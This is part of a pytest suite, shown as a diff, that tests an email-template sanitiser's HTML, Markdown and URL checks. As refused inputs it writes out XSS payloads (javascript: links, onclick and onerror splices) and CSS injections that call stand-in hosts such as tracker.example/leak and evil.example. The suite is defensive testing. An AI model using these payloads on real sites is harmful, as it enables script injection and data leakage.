+    *((R.MODE_ELEMENTS, f"<{tag}>x</{tag}>", False) for tag in sorted(MODE_ELEMENTS)),
+    (R.ENDS_IN_TEXT, "<p>x</p><a", False),
+    (R.ENDS_IN_TEXT, '<p>x</p><a title="x', False),
+    (R.ENDS_IN_TEXT, '<p>x</p><a href="https://example.test/"', False),
+    (R.ENDS_IN_TEXT, "<p>x</p><style>", False),
+    (R.ENDS_IN_TEXT, "<p>x</p><title>", False),
+    (R.ENDS_IN_TEXT, "<p>x</p><!--", False),
+]
+SPELLING_ADMITTED: list[tuple[str, bool]] = [
+    ('<P TITLE="x">y</P>', False),
+    ('<a\nhref="https://example.test/"\n\ttitle="{{ a }}"  class="b">x</a>', False),
+    ("<td nowrap>x</td>", False),
+    ('<br/><br /><hr /><img src="https://example.test/a.png" alt="" />', False),
+    ("<p>AT&T, Q&A, R&D &amp; 5 &lt; 6</p>", False),
+    ("<p>AT&T", False),
+    ('<p title="a &amp; &lt;b&gt; &quot;c&quot;">x</p>', False),
+    ("<title>{{ subject }}{% if a %} {{ a }}{% endif %}</title><style>.a{color:{{ brand.dark.text }}}</style>", False),
+    ("<!doctype html><html><head><title>{{ subject }}</title></head><body>{{ x }}</body></html>", True),
+    ("<!DOCTYPE html><p>x</p>", True),
+]
+
+
+@pytest.mark.parametrize(("rule", "html", "document"), [
+    pytest.param(rule, html, document, id=f"{rule.value}-{rule.name.lower()}-{index}")
+    for index, (rule, html, document) in enumerate(SPELLING_REFUSED)
+])
+def test_each_spelling_rule_refuses_with_its_message(rule: SpellingRule, html: str, document: bool) -> None:
+    """Section 1: a form is admitted only in the strict spelling; each rule refuses with its own message."""
+
+    refusals = check_html(html, compiled_expression(HTML_ENGINE), document=document)
+    assert any(rule.message in refusal and f"(rule {rule.value})" in refusal for refusal in refusals), refusals
+
+
+@pytest.mark.parametrize(("html", "document"), SPELLING_ADMITTED)
+def test_the_strict_spelling_admits_what_every_reader_reads_alike(html: str, document: bool) -> None:
+    """The case of names, the gaps between attributes, void elements' slashes and character references are free."""
+
+    assert check_html(html, compiled_expression(HTML_ENGINE), document=document) == []
+
+
+def test_a_self_closing_style_is_refused_by_rule_4(plain: Any) -> None:
+    """A browser ignores the slash of <style/>, so what follows is CSS: in a template, a block, a layout."""
+
+    del plain
+    for row in (
+        _unsaved(format="html", source="<p>Hi</p><style/><p>Hello {{ name }}, welcome.</p></style>",
+                 text_source="{{ name }}", variables={"name": "x"}),
+        _unsaved("block", "styled", source="<p>Hi</p><style/>", text_source="Hi"),
+        _unsaved("layout", "styled", source=PLAIN_LAYOUT.replace("</head>", "<style/></head>"), text_source=PLAIN_TEXT),
+    ):
+        refusals = _refusals(row)
+        assert any(R.SELF_CLOSING.message in refusal for refusal in refusals), (row.kind, refusals)
+
+
+def test_template_code_glued_to_an_end_tag_is_refused_by_rule_6(plain: Any) -> None:
+    """</title{{ v }}> is title text to html.parser and an end tag to a browser once a value supplies its end."""
+
+    del plain
+    row = _unsaved(format="html", text_source="x", variables={"v": "x", "w": "x"},
+                   source='<title>Hi</title{{ v }}><img alt={{ w }} src="https://example.test/x.png"></title><p>B</p>')
+    assert any(R.TEMPLATE_CODE.message in refusal for refusal in _refusals(row)), _refusals(row)
+
+
+def test_a_literal_nul_is_refused_by_rule_1_before_anything_reads_it(
+    plain: Any, kit: Any, caplog: pytest.LogCaptureFixture,
+) -> None:
+    """A NUL forged the checks' placeholders: it hid a value from the style check and raised IndexError."""
+
+    del plain
+    for source in ('<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ name }}">y</p>',
+                   '<p title="\x009\x00">x</p>'):
+        row = _unsaved(format="html", source=source, text_source="x", variables={"name": "x"})
+        assert any(R.NO_NUL.message in refusal for refusal in _refusals(row)), source
+        saved = _mail(source, {"name": "x"}, format="html", text_source="x", key="tests.nul")
+        with pytest.raises(ValidationError, match="NUL"):
+            _render(saved, {"name": "x"}, kit)
+        with system_context(reason="tests.messaging_templates.render.nul"):
+            assert saved.preview(kit=kit).rendered is None
+            saved.delete()
+    _row("layout", "shipped", is_baseline=True)
+    shipped = _row("part", "said", format="html", source="<b>Said.</b>", text_source="Said.", is_baseline=True)
+    template = _row("template", "tests.said", source='{% include "parts/said" only %}', layout="shipped",
+                    is_baseline=True)
+    with system_context(reason="tests.messaging_templates.render.nul"):
+        override = MessageTemplate.objects.override(shipped)
+        override.source = '<p title="\x009\x00">x</p>'
+        override.save()  # past clean: the deployment's row holds a NUL
+        with caplog.at_level(logging.WARNING, logger="angee.messaging_templates.models"):
+            MessageTemplate.after_resource_load([template], tier="install", source="tests")
+    assert any("NUL" in record.getMessage() for record in caplog.records)
+
+
+@pytest.mark.parametrize(
+    ("ending", "refused"),
+    [
+        ("<a", True), ('<a href="https://example.test/"', True), ('<a title="x', True), ("<a href=", True),
+        ("<style>", True), ("<style>.a{", True), ("<title>", True), ("<!--", True), ("<!", True), ("</", True),
+        ("&am", False), ("AT&T", False), ("Q&A", False), ("5 <", True), ("<b><i>", False), ("", False),
+    ],
+)
+def test_a_form_ends_where_it_started(ending: str, refused: bool) -> None:
+    """S2 (i3): html.parser drops an unfinished tag at the end and never closes <style>; a form ends in text."""
+
+    refusals = check_html("<p>x</p>" + ending, compiled_expression(HTML_ENGINE))
+    assert bool(refusals) is refused, refusals
+
+
+def test_a_row_cannot_leave_the_next_row_inside_a_tag_or_a_style(plain: Any, kit: Any) -> None:
+    """S2 (a1, a2): a block ending inside a tag or a <style> is refused, so no template's value lands there."""
+
+    del plain
+    continuations = {
+        "open_a": ("<p>Hi</p><a", ' href="{{ link }}" style="background:url({{ link }})">Open</a>'),
+        "open_attribute": ('<p>Hi</p><a title="x"', ' href="{{ link }}">Open</a>'),
+        "open_quote": ('<p>Hi</p><a title="x', '" href="{{ link }}">Open</a>'),
+        "open_style": ("<p>Hi</p><style>", "Hello {{ link }}, welcome."),
+    }
+    for key, (ending, continuation) in continuations.items():
+        assert any("it ends inside" in refusal for refusal in _refusals(_unsaved(
+            "block", key, source=ending, text_source="x"))), key
+        _row("block", key, source=ending, text_source="x")  # past clean, as a write that skipped the walk
+        template = _mail(f'{{% include "blocks/{key}" only %}}{continuation}', {"link": "x"}, format="html",
+                         text_source="{{ link }}", key=f"tests.{key}")
+        with pytest.raises(ValidationError, match="it ends inside"):
+            _render(template, {"link": "javascript:alert(document.domain)"}, kit)
+
+
+def test_link_attributes_follow_url_and_text_attributes_are_text() -> None:
+    """URL-valued attributes: the ones mail links with follow url; the others are refused by name; text is text."""
+
+    expression = compiled_expression(HTML_ENGINE)
+    for name in ("href", "src", "background", "cite", "poster", "action"):
+        for value in ("javascript:alert(1)", "JaVaScRiPt:x", "java&#9;script:x", "data:text/html,x"):
+            assert check_html(f'<td {name}="{value}">x</td>', expression), (name, value)
+        assert check_html(f'<td {name}="https://example.test/a.png">x</td>', expression) == [], name
+    for name in ("ping", "longdesc", "lowsrc", "dynsrc", "usemap", "data", "codebase", "archive", "manifest",
+                 "profile", "formaction", "srcset", "icon", "xlink:href"):
+        assert any(f"the {name} attribute is not allowed" in refusal for refusal in check_html(
+            f'<img {name}="https://example.test/">', expression)), name
+    # A scheme an author splices from branches has nowhere left to go: each URL attribute is listed.
+    assert check_html('<img longdesc="{% if a %}java{% else %}x{% endif %}script:alert(1)" alt="a">', expression)
+    for admitted in ('<img alt="Data: 2026 results">', '<p title="File: Q3 report.pdf">x</p>',
+                     '<img alt="JavaScript: The Good Parts">', '<p title="Note: hello">x</p>',
+                     '<html xmlns:v="urn:schemas-microsoft-com:vml">', '<p class="sm:hidden">x</p>',
+                     '<p style="color:red;background:#fff">x</p>',
+                     '<meta content="width=device-width, initial-scale=1">'):
+        assert check_html(admitted, expression) == [], admitted
+
+
+OUTLOOK_DPI = (
+    "<!--[if mso]><xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings>"
+    "</xml><![endif]-->"
+)
+GHOST = (
+    '<!--[if mso]><table role="presentation" width="600" align="center"><tr><td><![endif]-->'
+    "<table><tr><td>{{ x }}</td></tr></table><!--[if mso]></td></tr></table><![endif]-->"
+)
+
+
+@pytest.mark.parametrize(
+    ("html", "refused"),
+    [
+        pytest.param(OUTLOOK_DPI, False, id="dpi"),
+        pytest.param("<!--[if mso]><style>td{font-family:Arial,sans-serif !important}</style><![endif]-->", False,
+                     id="font-override"),
+        pytest.param(GHOST, False, id="ghost-table"),
+        pytest.param("<!--[if !mso]><!--><p>{{ x }}</p><!--<![endif]-->", False, id="revealed-pair"),
+        pytest.param("<!--[if mso]><b>{{ x }}</b><![endif]-->", True, id="template-code-inside"),
+        pytest.param("<!--[if mso]><!-- {{ x }} --><![endif]-->", True, id="template-code-in-a-nested-comment"),
+        pytest.param("<!-- note -->", True, id="plain-comment"),
+        pytest.param("<!--[if gte mso 9]><b>x</b><![endif]-->", True, id="other-condition"),
+        pytest.param("<!--[if mso]><v:roundrect></v:roundrect><![endif]-->", True, id="vml-button"),
+        pytest.param("<!--[if mso]><script>x</script><![endif]-->", True, id="script-inside"),
+        pytest.param('<!--[if mso]><p onclick="x">x</p><![endif]-->', True, id="event-inside"),
+        pytest.param('<!--[if mso]><a href="javascript:x">x</a><![endif]-->', True, id="link-inside"),
+        pytest.param('<!--[if mso]><a href="x<![endif]-->', True, id="ends-inside-a-tag"),
+        pytest.param("<!--[if mso]><style>td{<![endif]-->", True, id="ends-inside-style"),
+        pytest.param("<!--[if mso]><b>--!><p>x</p><![endif]-->", True, id="bang-close"),
+        pytest.param("</<![endif]>", True, id="bogus-close"),
+        pytest.param("<!--[if !mso]><!--><p>x</p>", True, id="revealed-unclosed"),
+        pytest.param("<p>x</p><!--<![endif]-->", True, id="revealed-unopened"),
+        pytest.param("<!--[if !mso]><!--><!--[if !mso]><!--><!--<![endif]--><!--<![endif]-->", True,
+                     id="revealed-nested"),
+        pytest.param("<!--[if !mso]><!-->" + OUTLOOK_DPI + "<!--<![endif]-->", True, id="mso-inside-revealed"),
+    ],
+)
+def test_a_layout_holds_outlooks_conditional_comments_alone(html: str, refused: bool) -> None:
+    """D2: a layout may carry static, balanced MSO conditional comments whose markup is checked as any other."""
+
+    assert bool(check_html(html, compiled_expression(HTML_ENGINE), document=True)) is refused, check_html(
+        html, compiled_expression(HTML_ENGINE), document=True)
+    assert check_html(html, compiled_expression(HTML_ENGINE)) or "<!--" not in html
+
+
+def test_only_a_layout_carries_outlooks_comments(plain: Any) -> None:
+    """D2: the kind's fact decides; a template, block or part carrying one is refused."""
+
+    del plain
+    assert _refusals(_unsaved("layout", "outlook", source=OUTLOOK_DPI + PLAIN_LAYOUT, text_source=PLAIN_TEXT)) == []
+    for row in (_unsaved(format="html", source=OUTLOOK_DPI, text_source="x"),
+                _unsaved("block", "outlook", source=OUTLOOK_DPI, text_source="x")):
+        assert any("which a layout alone holds for Outlook" in refusal for refusal in _refusals(row)), row.kind
+
+
+def test_static_url_as_decoded() -> None:
+    """A static link is judged as a browser follows it: html.parser decodes the entities first (q12)."""
+
+    for href in ("javascript&#58;alert(1)", "javascript&colon;alert(1)", "java&#x09;script:alert(1)",
+                 "&#x6A;avascript:alert(1)"):
+        assert check_html(f'<a href="{href}">x</a>', compiled_expression(HTML_ENGINE)), href
+    assert check_html('<a href="https://example.test/">x</a>', compiled_expression(HTML_ENGINE)) == []
+
+
+def test_if_splice_refused(plain: Any) -> None:
+    """An if whose ends sit in attributes of different elements would join them when false (q16)."""
+
+    del plain
+    source = ('<meta name="x" content="{% if x %}"><p>hidden</p>'
+              '<b title="{% endif %}" lang="en">t</b>')
+    assert any("whole tag pair" in message for message in _refusals(_unsaved(
+        format="html", text_source="x", source=source, variables={"x": "x"})))
+
+
+# ---------- the Markdown pass ----------
+
+
+@pytest.mark.parametrize(
+    ("source", "refusal"),
+    [
+        pytest.param("Use `{{ name }}` here.", "code inline", id="span-in-code-span"),
+        pytest.param("`{% if a %}`\n\n- item\n- `{% endif %}`\n", "code inline", id="pair-torn-through-code"),
+        pytest.param("{% if a %}\n\n```\n{% endif %}\n```\n", "fence", id="fenced-code-holds-endif"),
+        pytest.param("{% if a %}\n\nText\n\n    {% endif %}\n", "code block", id="indented-code-holds-endif"),
+        pytest.param("```{%endif%}\nx\n```\n", "fence", id="fence-info"),
+        pytest.param('[x](https://example.test "{{ name }}")', "link open", id="link-title"),
+        pytest.param("Write &#123;&#123; to show braces.", "text holds {{", id="entity-braces"),
+        pytest.param("Write &#123;&#123; name &#125;&#125; here.", "does not reach the template whole",
+                     id="entity-span"),
+        pytest.param("Write \\{\\{ name \\}\\} here.", "does not reach the template whole", id="backslash-braces"),
+        pytest.param('`{% include "parts/p" only %}`', "code inline", id="code-span-with-quotes"),
+        pytest.param("![logo]({{ name }})", "an image's source is an output", id="image-of-an-output"),
+        pytest.param("{% for i in items %}\n- {{ i }}\n{% endfor %}", "different Markdown blocks",
+                     id="list-swallows-endfor"),
+        pytest.param("Intro {% if a %} for VIPs\n\n## Heading {% endif %}", "different Markdown blocks",
+                     id="paragraph-to-heading"),
+        pytest.param('Hi {% include "parts/p" only %}', "not alone in its paragraph", id="include-inline"),
+    ],
+)
+def test_markdown_code_tokens(plain: Any, source: str, refusal: str) -> None:
+    """Template code reaches the engine only as a span of its own, kept whole (p4, q13)."""
+
+    del plain
+    _row("part", "p", source="P.")
+    refusals = _refusals(_unsaved(source=source, variables={"name": "x", "a": "x", "items.*": "x"}))
+    assert any(refusal in message for message in refusals), refusals
+
+
+def test_markdown_spans_reach_the_engine_whole(plain: Any, kit: Any) -> None:
+    """Property 7: quotes, comparison signs and filter arguments survive the Markdown pass."""
+
+    del plain
+    template = _mail(
+        "{% if count > 2 and name != 'Bo' %}Many{% endif %} **{{ name|truncatechars:3 }}** "
+        "[Open]({{ link }}) {% templatetag openvariable %} {# note #}\n\n"
+        "{% comment %}\n\n# Hidden {{ name }}\n\n{% endcomment %}\n\nShown",
+        {"count": "x", "name": "x", "link": "x"},
+    )
+    rendered = _render(template, {"count": 3, "name": "Ana Lima", "link": "https://example.test/a?b=1&c=2"}, kit)
+    assert "Many <strong>An…</strong>" in rendered.html
+    assert 'href="https://example.test/a?b=1&amp;c=2"' in rendered.html
+    assert "{{" in rendered.html and "Hidden" not in rendered.html and "<p style=\"margin:0 0 16px\">Shown</p>" in (
+        rendered.html)
+    assert "Many An… Open (https://example.test/a?b=1&c=2) {{" in rendered.plain_text
+
+
+def test_the_plain_text_form_is_written_from_the_markdown(plain: Any, kit: Any) -> None:
+    """The plain-text body comes from the Markdown tokens: links as ``label (url)``, items, quotes, code."""
+
+    del plain
+    template = _mail(
+        "# Title\n\nSome *text*, a [link](https://example.test/a) and [mine]({{ link }}).\n\n"
+        "{% if link %}\n\n- one\n- two\n\n{% endif %}\n\n1. first\n2. second\n\n> quoted\n> line\n\n    code\n",
+        {"link": "x"},
+    )
+    rendered = _render(template, {"link": "https://example.test/b"}, kit)
+    assert rendered.plain_text == (
+        "Title\n\nSome text, a link (https://example.test/a) and mine (https://example.test/b).\n\n"
+        "- one\n- two\n\n1. first\n2. second\n\n> quoted\n> line\n\ncode\n"
+    )
+    assert "<h1" in rendered.html and "<ol" in rendered.html and "<blockquote" in rendered.html
+
+
+def test_reference_definitions_off(plain: Any) -> None:
+    """A link reference definition is text, never expanded at each use (q3), and entities count in the form (q3b)."""
+
+    del plain
+    title = ("{{" * 30 + "x" * 1_000)[:980]
+    source = f'[r]: /u "{title}"\n\n' + "\n".join(["[r]" * 30] * 40)
+    with _within(0.5):
+        refusals = _refusals(_unsaved(source=source))
+        assert any("text holds {{" in message for message in refusals), refusals
+        assert not any("form holds over 60" in message for message in refusals), refusals
+    with system_context(reason="tests.messaging_templates.render.forms"):
+        forms = TemplateWalker().check(_unsaved(source="[r]: /u\n\n[r] and [r]")).forms
+    assert forms is not None and "<a" not in forms.html and "[r]: /u" in forms.html
+
+
+def test_values_never_become_markdown(plain: Any, kit: Any) -> None:
+    """Property 2: a value is one token to the Markdown pass; raw HTML in the source is text."""
+
+    del plain
+    template = _mail("Hello {{ name }}, welcome. Hi <b onclick=x>there</b>", {"name": "x"})
+    value = "[Win](https://evil.example) **x** <b>y</b>\n\n# Urgent"
+    rendered = _render(template, {"name": value}, kit)
+    assert "evil.example</a>" not in rendered.html and "<strong>" not in rendered.html and "<h1" not in rendered.html
+    assert "&lt;b&gt;y&lt;/b&gt;" in rendered.html and "&lt;b onclick=x&gt;there&lt;/b&gt;" in rendered.html
+    assert value in rendered.plain_text
+    assert any("does not compile" in message for message in _refusals(_unsaved(
+        source="{% verbatim %}{{ x }}{% endverbatim %}")))
+
+
+# ---------- values ----------
+
+
+def _reading(html: str, *, scripting: bool) -> tuple[list[tuple[Any, ...]], list[str]]:
+    """What a browser reads of a rendered body, by html5lib's WHATWG tokeniser and tree construction.
+
+    The elements in document order with their attributes, and the comments; then the text of every ``style`` and
+    ``script`` element. ``scripting`` reads ``noscript`` as a browser with scripting on or off does. Independent of
+    the ``html.parser`` the HTML checks are built on, so a difference between the two is what it finds.
+    """
+
+    root = html5lib.HTMLParser(namespaceHTMLElements=False).parse(html, scripting=scripting)
+    markup: list[tuple[Any, ...]] = []
+    raw: list[str] = []
+    for element in root.iter():
+        if not isinstance(element.tag, str):
+            markup.append(("comment", element.text))
+        elif element.tag != "br":  # linebreaksbr writes <br> after escaping, as it may
+            markup.append(("start", element.tag, tuple(element.attrib.items())))
+            if element.tag in ("style", "script"):
+                raw.append(element.text or "")
+    return markup, raw
+
+
+MARKER = "MARKER"
+_HTML_SPACE = " \t\n\f\r"
+
+
+def _harmless(value: str) -> str:
+    """The harmless value a hostile ``value`` is compared with: of its kind, empty, HTML white space, or visible text.
+
+    An author's ``{% if v %}`` chooses author markup by a value's truthiness, and a browser's tree builder implies
+    or clones author elements by whether text is present and whether it is white space (a stray ``</p>`` before the
+    body, text in a table, a formatting element reopened). Neither makes a value markup, so values are compared
+    with one of their own kind: the same empty or white-space value, else :data:`MARKER`.
+    """
+
+    return value if not value.strip(_HTML_SPACE) else MARKER
+
+
+def _assert_value_stays_text(marker_html: str, hostile_html: str, value: str) -> None:
+    """Property 1: ``value`` adds no element, attribute or comment, no text in style or script, a link only by ``url``.
+
+    ``marker_html`` is the same rows rendered with ``_harmless(value)``. A browser's reading of both has
+    the same elements, attribute names and comments, the same ``style`` and ``script`` text, and attribute values
+    that differ only where the HTML checks admit an output (``title``, ``alt``…) or in a link attribute as ``url``
+    makes a link of the value.
+    """
+
+    for scripting in (False, True):
+        (marker, marker_raw), (hostile, hostile_raw) = (
+            _reading(marker_html, scripting=scripting), _reading(hostile_html, scripting=scripting))
+        assert hostile_raw == marker_raw, (hostile_raw, marker_raw)
+        assert [event[:2] for event in hostile] == [event[:2] for event in marker], hostile_html
+        for before, after in zip(marker, hostile, strict=True):
+            if before[0] != "start":
+                assert after == before
+                continue
+            assert [name for name, _ in after[2]] == [name for name, _ in before[2]], (before, after)
+            for (name, was), (_, now) in zip(before[2], after[2], strict=True):
+                if name in OUTPUT_ATTRIBUTES or (
+                    name in LINK_ATTRIBUTES and (was, now) == (url(_harmless(value)), url(value))
+                ):
+                    continue
+                assert now == was, (before[1], name, was, now)
+
+
+class _Rows:
+    """A reader over unsaved rows, so a property walks rows without writing them."""
+
+    def __init__(self, *rows: Any) -> None:
+        self.rows = {row.handler.template_name(row.key): row for row in rows}
+
+    def named_rows(self, names: Iterable[str], *, language: str) -> dict[str, Any]:
+        del language
+        return {name: self.rows[name] for name in names if name in self.rows}
+
+    def resolves_name(self, name: str) -> bool:
+        return name in self.rows
+
+
+SPLICE = "y style=color:red onclick=alert(1)"
+JAVASCRIPT = "javascript:alert(document.domain)"
+CSS = "}*{background:url(https://tracker.example/leak?)}@import url(https://evil.example/x.css);"
+HOSTILE = [
+    SPLICE, JAVASCRIPT, CSS, '"><b onclick=x>', "</style><b onclick=x>", "' onclick=x '", "-->", "]]>", "x\x00y",
+    "/", "/ onerror=alert(1)", ";background-image:url(https://tracker.example/leak)",
+]
+
+_ATTRIBUTE = st.builds(
+    lambda gap, name, quoting, value: gap + name + quoting.format(value),
+    st.sampled_from([" ", "\n", "\t", "\x0c", "\r", "\x0b", "\xa0", "/", "", "\x00"]),
+    st.sampled_from(["title", "TITLE", "alt", "href", "style", "class", "=x", 'x"', "lang", "dir", "src"]),
+    st.sampled_from(['="{}"', "='{}'", "={}", ' = "{}"', '="{}"\x0b', '\x0c="{}"', '="{}"/']),
+    st.sampled_from(["x", "{{ v }}", "{{ v|url }}", "{{ v|upper }}", "{% if v %}{{ v }}{% endif %}",
+                     "color:{{ brand.light.text }}", "a>b", "&amp;", "&quot;", ""]),
+)
+_START_TAG = st.builds(
+    lambda tag, attributes, end: "<" + tag + "".join(attributes) + end,
+    st.sampled_from(["p", "span", "a", "td", "table", "tr", "select", "option", "style", "title", "img", "b", "div",
+                     "STYLE", "Title", "br", "noscript", "xmp", "textarea"]),
+    st.lists(_ATTRIBUTE, max_size=2),
+    st.sampled_from([">", "/>", " />", " / >", "//>", "\x0b>", "\r>", "\xa0>", ""]),
+)
+_PLAIN_TAG = st.builds(
+    lambda tag, attributes, end: "<" + tag + "".join(attributes) + end,
+    st.sampled_from(["p", "span", "a", "td", "table", "tr", "b", "div", "img", "br", "title", "style"]),
+    st.lists(st.builds(
+        lambda name, value: f' {name}="{value}"',
+        st.sampled_from(["title", "alt", "href", "style", "class", "lang", "src"]),
+        st.sampled_from(["x", "{{ v }}", "{{ v|url }}", "{% if v %}{{ v }}{% endif %}", "color:{{ brand.light.text }}",
+                         "&amp;", ""]),
+    ), max_size=2, unique_by=lambda attribute: attribute.split("=", 1)[0]),
+    st.sampled_from([">", " />"]),
+)
+"""Tags spelled as the checks admit them, so that admitted compositions are drawn often enough to matter."""
+_PLAIN = st.sampled_from([
+    "</p>", "</span>", "</a>", "</b>", "</div>", "</td>", "</tr>", "</title>", "text", "{{ v }}", "&amp;", "AT&T",
+    "{% if v %}{{ v }}{% endif %}",
+])
+_HTML = st.lists(
+    st.one_of(_PLAIN_TAG, _PLAIN_TAG, _PLAIN_TAG, _PLAIN, _PLAIN, _PLAIN, _START_TAG, st.sampled_from([
+        "</style>", "</style\x0b>", "</style/>", "</table>", "</select>", '"', "'", ">", "<", "&", "&lt", "\n",
+        "<!--x-->", "<!x>", "</ x>", "<?x>", "</>", "<![CDATA[x]]>", "<!doctype html>", '</p x="{{ v }}">', "<br/>",
+        "</title{{ v }}>", "<style/>", "<!--[if mso]><b>x</b><![endif]-->", "{% if v %}", "{% endif %}",
+    ])),
+    max_size=5,
+).map("".join)
+_PART = st.one_of(st.just(""), _HTML)
+"""One row's part of a composition; often empty, so that most compositions differ from an admitted one in one place."""
+
+
+@settings(
+    deadline=None, max_examples=3000,
+    suppress_health_check=[HealthCheck.function_scoped_fixture, HealthCheck.too_slow, HealthCheck.filter_too_much],
+)
+@given(head=_PART, tail=_PART, before=_PART, block=_PART, after=_PART, value=st.one_of(
+    st.sampled_from(HOSTILE), st.text(max_size=40)))
+# Rows found to break the property: a repeated attribute name and a noscript splice (S1); a row ending inside a tag
+# or a <style> (S2); a self-closing <style/>, in a block and in a layout (rule 4); template code glued to </title
+# (rule 6); a literal NUL forging a placeholder (rule 1).
+@example(head="", tail="", before='<span title="a" title={{ v }}>x</span>', block="", after="", value=SPLICE)
+@example(head="", tail="", before='<span TITLE="a" title={{ v }}>x</span>', block="", after="", value=SPLICE)
+@example(head="", tail="", before='<noscript><p title="</noscript><b title={{ v }}>"></p></noscript>', block="",
+         after="", value=SPLICE)
+@example(head="", tail="", before="", block="<p>Hi</p><a",
+         after=' href="{{ v }}" style="background:url({{ v }})">Open</a>', value=JAVASCRIPT)
+@example(head="", tail="", before="", block='<p>Hi</p><a title="x', after='" href="{{ v }}">Open</a>',
+         value=JAVASCRIPT)
+@example(head="", tail="", before="", block="<p>Hi</p><style>", after="Hello {{ v }}, welcome.", value=CSS)
+@example(head="", tail="", before="", block="<p>Hi</p><style/>", after="<p>Hello {{ v }}, welcome.</p>", value=CSS)
+@example(head="<p>Hi</p><style/>", tail="", before="", block="", after="<p>Hello {{ v }}, welcome.</p>", value=CSS)
+@example(head="", tail="", before='<title>Hi</title{{ v }}><img alt={{ v }} src="https://example.test/x.png"></title>',
+         block="", after="<p>Body</p>", value="/ onerror=alert(1)")
+@example(head="", tail="", before='<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ v }}">y</p>',
+         block="", after="", value=";background-image:url(https://tracker.example/leak)")
+def test_a_value_never_becomes_markup(
+    kit: Any, head: str, tail: str, before: str, block: str, after: str, value: str,
+) -> None:
+    """Property 1, over the rows the walk admits, read as a browser reads them (html5lib).
+
+    The rows meet as a layout around a template and a template around an included block, each drawn from tags in
+    every quoting, spelling and whitespace of their attributes, self-closing and raw-text elements, comments,
+    declarations, entities and template code, ending anywhere.
+    """
+
+    template = _unsaved(
+        format="html", source=before + '{% include "blocks/probe" with v=v only %}' + after, text_source="{{ v }}",
+        variables={"v": "x"}, layout="probe",
+    )
+    rows = _Rows(
+        template, _unsaved("block", "probe", source=block, text_source="x", variables={"v": "x"}),
+        _unsaved("layout", "probe", source=head + "{% block content %}{% endblock %}" + tail, text_source=PLAIN_TEXT,
+                 variables={"v": "x"}),
+    )
+    try:
+        walk = TemplateWalker(saving=True).walk(template, rows)
+    except ValidationError:
+        event("refused")
+        return  # a refused row never renders
+    event("admitted")
+    marker = walk.render({"v": _harmless(value)}, kit=kit).html
+    _assert_value_stays_text(marker, walk.render({"v": value}, kit=kit).html, value)
+
+
+_MARKDOWN = st.lists(st.sampled_from([
+    "{{ v }}", "[a]({{ v }})", "![a]({{ v }})", "[{{ v }}](https://example.test/)", "<{{ v }}>", "[a](<{{ v }}>)",
+    "`x`", "**b**", "<b>raw</b>", "<!-- c -->", "<style>", "<style/>", "\n\n", "\n", "- ", "> ", "# ", "    ",
+    '{% include "blocks/probe" with v=v only %}', "{% if v %}", "{% endif %}", "[r]: https://example.test/",
+    "&amp;", "&", "<", ">", '"', "https://example.test/{{ v }}", "\\\\",
+]), min_size=1, max_size=7).map("".join)
+
+
+@settings(deadline=None, max_examples=150, suppress_health_check=[HealthCheck.function_scoped_fixture])
+@given(source=_MARKDOWN, head=_HTML, value=st.one_of(st.sampled_from(HOSTILE), st.text(max_size=40)))
+@example(source="Hello **{{ v }}**.", head="<style/>", value=CSS)
+def test_a_value_never_becomes_markup_through_markdown(kit: Any, source: str, head: str, value: str) -> None:
+    """Property 1 for Markdown templates, in a layout whose head is drawn too, read as a browser reads them."""
+
+    template = _unsaved(source=source, variables={"v": "x"}, layout="probe")
+    rows = _Rows(
+        template, _unsaved("block", "probe", source="<b>{{ v }}</b>", text_source="x", variables={"v": "x"}),
+        _unsaved("layout", "probe", source=head + "{% block content %}{% endblock %}", text_source=PLAIN_TEXT),
+    )
+    try:
+        walk = TemplateWalker(saving=True).walk(template, rows)
+    except ValidationError:
+        return
+    marker = walk.render({"v": _harmless(value)}, kit=kit).html
+    _assert_value_stays_text(marker, walk.render({"v": value}, kit=kit).html, value)
+
+
+PROPERTY_SOURCE = (
+    '<p>{{ v }}|{% with w=v %}{{ w }}{% endwith %}|{% include "blocks/echo" with x=v only %}|'
+    "{% for i in items %}{{ i }}{% endfor %}|{{ v|default:'d' }}|{{ v|upper }}|{{ v|lower }}|{{ v|capfirst }}|"
+    "{{ v|title }}|{{ v|truncatechars:20 }}|{{ v|truncatewords:3 }}|{{ v|linebreaksbr }}|{{ v|length }}|"
+    "{{ when|date }}|{{ v|floatformat }}|{{ v|pluralize }}|{{ v|yesno }}</p>"
+    '<a href="{{ v|url }}" title="{{ v }}">{{ v|url }}</a><img alt="{{ v|upper }}" src="{{ v|default:\'\'|url }}" />'
+)
+
+
+@settings(deadline=None, max_examples=40, suppress_health_check=[HealthCheck.function_scoped_fixture])
+@given(value=st.text(max_size=60))
+def test_a_value_never_becomes_markup_through_any_filter(plain: Any, kit: Any, value: str) -> None:
+    """Property 1, through every filter and every path a value takes: output, alias, argument, item, default."""
+
+    del plain
+    with system_context(reason="tests.messaging_templates.render.property"):
+        if not MessageTemplate.objects.filter(key="echo").exists():
+            _row("block", "echo", source="<i>{{ x }}</i>", text_source="{{ x }}", variables={"x": "x"})
+            _mail(PROPERTY_SOURCE, {"v": "x", "items.*": "x", "when": "x"}, format="html", text_source="{{ v }}",
+                  key="tests.property")
+        template = MessageTemplate.objects.get(key="tests.property")
+    for candidate in (value, SafeString(value), mark_safe("<b>" + value + "</b>")):
+        harmless = _harmless(str(candidate))
+        marker = _render(template, {"v": harmless, "items": [harmless], "when": "2026-11-24"}, kit).html
+        rendered = _render(template, {"v": candidate, "items": [candidate], "when": "2026-11-24"}, kit)
+        _assert_value_stays_text(marker, rendered.html, str(candidate))
+
+
+def test_a_url_value_gives_a_link_or_nothing(plain: Any, kit: Any) -> None:
+    """Property 3: unsafe schemes and every data: URL give an empty target; a quote cannot leave an attribute."""
+
+    del plain
+    template = _mail('<a href="{{ link|url }}">x</a>', {"link": "x"}, format="html", text_source="{{ link|url }}")
+    for link in ("javascript:alert(1)", "JaVaScRiPt:alert(1)", "vbscript:x", "file:///etc/passwd",
+                 "data:text/html,x", "data:image/png;base64,AAAA", "https://" + "a" * 2_050):
+        assert 'href=""' in _render(template, {"link": link}, kit).html, link
+    rendered = _render(template, {"link": 'https://example.test/" onclick="x'}, kit)
+    marker = _render(template, {"link": MARKER}, kit).html
+    _assert_value_stays_text(marker, rendered.html, 'https://example.test/" onclick="x')
+    assert url("https://example.test/") == "https://example.test/"
+
+
+def test_method_fallback_closed(plain: Any, kit: Any) -> None:
